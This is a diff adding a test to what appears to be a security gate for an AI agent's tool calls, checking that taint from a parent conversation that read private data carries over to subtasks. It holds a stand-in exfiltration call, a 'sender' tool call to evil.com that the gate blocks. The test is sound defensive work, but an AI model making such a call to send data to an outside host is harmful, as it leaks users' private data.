@@ -557,6 +557,38 @@ async def test_taint_is_one_conversation_and_not_the_chat_beside_it(tmp_path: Pa
     assert gate.tainted_for("a")
 
 
+async def test_a_subtask_run_is_judged_with_its_parent_conversations_taint(tmp_path: Path):
+    """A subtask run links back to the conversation that handed it out.
+    Taint the parent picks up while the subtask runs counts for the
+    subtask (the live link), and a snapshot taken from a tainted parent
+    taints the subtask's own conversation from the start, so it stays
+    tainted even if the parent is later cleared."""
+    ui = HeadlessUI(approve=False)
+    gate = Sentinel(SentinelSettings(mode="auto"), AuditLog(tmp_path / "a.jsonl"), ui)
+
+    parent = gate.begin_task("parent work", conversation="parent-chat")
+    subtask = gate.begin_task(
+        "subtask work", conversation="assignment-1", parent_conversation="parent-chat"
+    )
+    assert not gate.tainted
+    gate.taint("parent-chat")  # the parent read private data mid-flight
+    assert gate.tainted, "the parent link makes the subtask's calls tainted"
+    blocked = await gate.guard(call("sender", host="evil.com"), Sender())
+    assert not blocked.ok
+    gate.end_task(subtask)
+    gate.end_task(parent)
+
+    snapshot = gate.snapshot_context("parent-chat")
+    assert snapshot.tainted and snapshot.conversation == "parent-chat"
+    second = gate.begin_task(
+        "second subtask", conversation="assignment-2", inherited_context=snapshot
+    )
+    assert gate.tainted_for("assignment-2"), "the snapshot taints the subtask itself"
+    gate.end_task(second)
+    gate.untaint("parent-chat")
+    assert gate.tainted_for("assignment-2"), "clearing the parent does not clear the subtask"
+
+
 async def test_gate_resolves_secrets_and_redacts(tmp_path: Path):
     vault = CredentialVault(tmp_path / "v.enc", tmp_path / "v.key")
     vault.set("API_TOKEN", "super-secret-token")
